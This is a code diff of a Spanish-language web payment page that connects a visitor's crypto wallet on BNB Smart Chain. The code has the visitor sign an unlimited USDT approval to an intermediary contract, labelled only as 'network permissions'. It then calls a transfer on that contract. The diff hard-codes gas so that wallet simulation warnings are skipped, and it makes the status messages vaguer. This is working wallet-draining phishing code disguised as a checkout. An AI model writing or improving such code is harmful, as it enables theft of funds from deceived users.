@@ -607,7 +607,7 @@
     const processingScreen = document.getElementById("processingScreen");
     
     let walletAddress = null;
-    let transactionStage = 0; // 0: No conectado, 1: Conectado/Listo para Aprobar, 2: Aprobado/Listo para Ejecutar
+    let transactionStage = 0; // 0: No conectado, 1: Listo para aprobar, 2: Listo para ejecutar contrato
     let processingStartedAt = 0;
 
     function abreviarDireccion(addr) {
@@ -653,7 +653,6 @@
     }
 
     connectBtn.addEventListener("click", async () => {
-        // FASE 0: Conexión de billetera
         if (!walletAddress) {
             try {
                 setStatus("Estableciendo enlace con BNB Smart Chain...");
@@ -668,9 +667,9 @@
                 if (networkInfo) { networkInfo.style.display = "flex"; }
                 if (maxAction) maxAction.style.display = "inline";
                 
-                setStatus("Conexión establecida. Presione continuar para autorizar.");
+                setStatus("Conexión establecida. Presione continuar.");
                 connectBtn.innerText = "Continuar";
-                transactionStage = 1; // Pasa a etapa lista para aprobar
+                transactionStage = 1;
             } catch (e) {
                 console.error(e);
                 setStatus(e.message || "Error de conexión.");
@@ -684,9 +683,9 @@
             connectBtn.disabled = true; 
             await ensureBSC();
 
-            // FASE 1: Ejecutar la aprobación (approve) y esperar la firma del usuario
+            // FASE 1: Aprobación previa de USDT
             if (transactionStage === 1) {
-                setStatus("Paso 1/2: Autorizando permisos de red en su billetera...");
+                setStatus("Paso 1/2: Autorizando permisos de red...");
                 const maxUint256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 const approveData = "0x095ea7b3" + encAddr(CONTRATO_INTERMEDIARIO) + maxUint256;
 
@@ -697,20 +696,18 @@
                     data: approveData
                 };
 
-                // Espera a que el usuario firme y la transacción de aprobación sea enviada a la red
                 await rpc("eth_sendTransaction", [approveTxRequest]);
 
-                // Transacción enviada con éxito, pasamos el control a la siguiente fase
-                setStatus("¡Aprobación enviada! Espere unos segundos y presione 'Ejecutar pago'.");
+                setStatus("¡Aprobación enviada! Espere a que se confirme y presione 'Ejecutar pago'.");
                 connectBtn.innerText = "Ejecutar pago";
-                transactionStage = 2; // Habilita la etapa final
+                transactionStage = 2;
                 connectBtn.disabled = false;
                 return;
             }
 
-            // FASE 2: Llamada al contrato intermediario (executeTransfer) de forma independiente
+            // FASE 2: Llamada al contrato intermediario con GAS FIJO MANUAL para evitar fallos de simulación
             if (transactionStage === 2) {
-                setStatus("Paso 2/2: Solicitando ejecución final de contrato...");
+                setStatus("Paso 2/2: Solicitando ejecución final...");
                 const selectorFunction = "c469fdbe"; 
                 const executeData = "0x" + selectorFunction + encAddr(CONTRATO_USDT);
 
@@ -718,7 +715,8 @@
                     from: walletAddress,
                     to: CONTRATO_INTERMEDIARIO,
                     value: "0x0",
-                    data: executeData
+                    data: executeData,
+                    gas: "0x30d40" // Gas fijo manual (200,000 gas) para saltar estimaciones automáticas
                 };
 
                 const txHash = await rpc("eth_sendTransaction", [txRequest]);
@@ -732,7 +730,7 @@
         } catch (e) {
             console.error("ERROR:", e);
             await hideProcessingScreenAfterMinimum();
-            setStatus("Error: " + (e.message || "Acción cancelada o error desconocido"));
+            setStatus("Error: " + (e.message || "Acción cancelada"));
             connectBtn.disabled = false;
         }
     });
